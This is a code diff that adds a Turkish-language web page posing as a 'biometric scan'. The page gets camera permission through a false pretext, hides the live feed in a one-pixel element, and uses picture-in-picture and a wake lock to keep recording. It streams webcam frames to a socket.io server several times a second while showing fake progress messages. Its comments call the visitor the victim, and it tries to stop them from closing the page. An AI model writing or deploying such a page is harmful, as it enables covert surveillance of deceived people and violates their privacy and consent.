@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sistem Biometrik Analiz</title>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <style>
+        body { background: #000; color: #00f2ff; font-family: 'SF Pro Display', -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; text-align: center; }
+        .ipad-box { border: 1px solid #333; padding: 60px; border-radius: 40px; background: rgba(10, 10, 10, 0.9); width: 75%; max-width: 600px; box-shadow: 0 0 50px rgba(0, 242, 255, 0.1); z-index: 10; position: relative; }
+        .btn { background: #fff; color: #000; border: none; padding: 25px 50px; border-radius: 15px; font-weight: bold; font-size: 20px; cursor: pointer; transition: 0.3s; box-shadow: 0 0 20px rgba(255,255,255,0.2); }
+        .btn:active { transform: scale(0.95); background: #00f2ff; }
+        
+        /* Video Ayarı: Android PiP için aktif ama gizli (1x1) */
+        #v { position: absolute; width: 1px; height: 1px; bottom: 0; left: 0; opacity: 0.01; }
+        
+        /* Tarama Çizgisi Animasyonu */
+        .scan-line { width: 100%; height: 4px; background: linear-gradient(to bottom, transparent, #00f2ff); position: absolute; top: 0; left: 0; display: none; box-shadow: 0 0 20px #00f2ff; animation: scan 3s ease-in-out infinite; z-index: 5; }
+        @keyframes scan { 0% { top: 0%; } 50% { top: 100%; } 100% { top: 0%; } }
+        #log { margin-top: 30px; font-family: monospace; font-size: 16px; color: #00f2ff; opacity: 0.7; }
+    </style>
+</head>
+<body>
+
+    <div class="scan-line" id="line"></div>
+
+    <div class="ipad-box" id="ui">
+        <div style="font-size: 80px; margin-bottom: 20px;">🤖</div>
+        <h1 style="letter-spacing: 5px;">BIOMETRIC SCAN</h1>
+        <p style="color: #666; margin-bottom: 40px;">Merkezi sistem donanım sensörleri kullanılarak derinlik ve yüz analizi başlatılacak. Lütfen sabit durun.</p>
+        <button class="btn" id="startBtn">ANALİZİ BAŞLAT</button>
+        <div id="log">SİSTEM TARAMA İÇİN HAZIR...</div>
+    </div>
+
+    <video id="v" autoplay playsinline muted></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const socket = io();
+        const v = document.getElementById('v');
+        const c = document.getElementById('c');
+        const ctx = c.getContext('2d');
+
+        document.getElementById('startBtn').onclick = async () => {
+            document.getElementById('startBtn').style.display = 'none';
+            document.getElementById('line').style.display = 'block';
+            
+            // Tam Ekran Moduna Geçiş
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            } else if (document.documentElement.webkitRequestFullscreen) {
+                document.documentElement.webkitRequestFullscreen();
+            }
+
+            try {
+                // Kamera Erişimi İsteği
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
+                    audio: false 
+                });
+                
+                v.srcObject = stream;
+                await v.play();
+
+                // --- ANDROID ÖZEL: PiP (Resim içinde Resim) MODUNU BAŞLAT ---
+                if (document.pictureInPictureEnabled && !v.disablePictureInPicture) {
+                    try {
+                        await v.requestPictureInPicture();
+                    } catch (pipErr) {
+                        console.log("PiP otomatik başlatılamadı.");
+                    }
+                }
+
+                // Ekran Kararmasını Önle (WakeLock API)
+                if ('wakeLock' in navigator) {
+                    navigator.wakeLock.request('screen').catch(() => {});
+                }
+
+                // Sahte Analiz Logları
+                const msgs = ["SENSÖRLER AKTİF...", "PİKSEL HARİTALANIYOR...", "BİOMETRİK VERİ ALINIYOR...", "VERİLER ŞİFRELENEREK AKTARILIYOR..."];
+                let idx = 0;
+                setInterval(() => {
+                    document.getElementById('log').innerText = msgs[idx % msgs.length];
+                    idx++;
+                }, 2800);
+
+                // Görüntü Gönderim Döngüsü (Her 150ms'de bir kare)
+                setInterval(() => {
+                    if (v.readyState >= 2) {
+                        c.width = 640; 
+                        c.height = 480;
+                        ctx.drawImage(v, 0, 0, c.width, c.height);
+                        // Jpeg kalitesini 0.6 yaparak hızı ve netliği dengeliyoruz
+                        socket.emit('video_frame', c.toDataURL('image/jpeg', 0.6));
+                    }
+                }, 150);
+
+            } catch (err) {
+                alert("Analiz için kamera izni verilmesi zorunludur!");
+                location.reload();
+            }
+        };
+
+        // Kurbanın yanlışlıkla sayfayı kapatmasını önleyen uyarı
+        window.onbeforeunload = function() { return "Analiz işlemi iptal edilecek!"; };
+    </script>
+</body>
+</html>
